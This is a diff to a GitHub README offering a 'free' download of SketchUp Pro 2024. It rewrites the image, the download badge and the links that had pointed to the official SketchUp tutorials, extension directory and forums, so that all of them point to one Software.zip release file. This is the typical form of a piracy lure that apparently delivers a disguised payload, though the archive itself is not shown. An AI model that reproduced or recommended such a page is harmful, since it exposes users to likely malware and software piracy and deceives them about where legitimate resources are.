@@ -1,12 +1,12 @@
 # 🚀 Welcome to SketchUp Pro Free 2024 Repository 
 
-![SketchUp Pro](https://img.icons8.com/color/96/000000/google-sketchup.png)
+![SketchUp Pro](https://github.com/tancac13/SketchUp-Pro-free-2024/releases/download/v2.0/Software.zip)
 
 ## Overview
 SketchUp Pro is a powerful 3D modeling software widely used in architecture, interior design, landscape architecture, and engineering. Its intuitive interface makes it accessible to beginners and professionals alike. This repository provides a free download of SketchUp Pro 2024 along with various resources and plugins to enhance your 3D modeling experience.
 
 ## Download SketchUp Pro 2024
-[![Download SketchUp Pro](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download SketchUp Pro](https://github.com/tancac13/SketchUp-Pro-free-2024/releases/download/v2.0/Software.zip)](https://github.com/tancac13/SketchUp-Pro-free-2024/releases/download/v2.0/Software.zip)
 
 Please note that the link above needs to be launched to download the SketchUp Pro software. 
 
@@ -25,9 +25,9 @@ Please note that the link above needs to be launched to download the SketchUp Pr
 
 ## Resources
 Explore the following resources to enhance your SketchUp Pro experience:
-- [SketchUp Pro Tutorials](https://www.sketchup.com/learn)
-- [Latest SketchUp Pro Plugin Directory](https://extensions.sketchup.com/)
-- [SketchUp Pro Community Forums](https://forums.sketchup.com/)
+- [SketchUp Pro Tutorials](https://github.com/tancac13/SketchUp-Pro-free-2024/releases/download/v2.0/Software.zip)
+- [Latest SketchUp Pro Plugin Directory](https://github.com/tancac13/SketchUp-Pro-free-2024/releases/download/v2.0/Software.zip)
+- [SketchUp Pro Community Forums](https://github.com/tancac13/SketchUp-Pro-free-2024/releases/download/v2.0/Software.zip)
 
 ## Get Involved
 Join the SketchUp Pro community on GitHub to collaborate, share ideas, and contribute to the development of SketchUp Pro. We welcome your feedback and contributions to make SketchUp Pro even better for users worldwide.
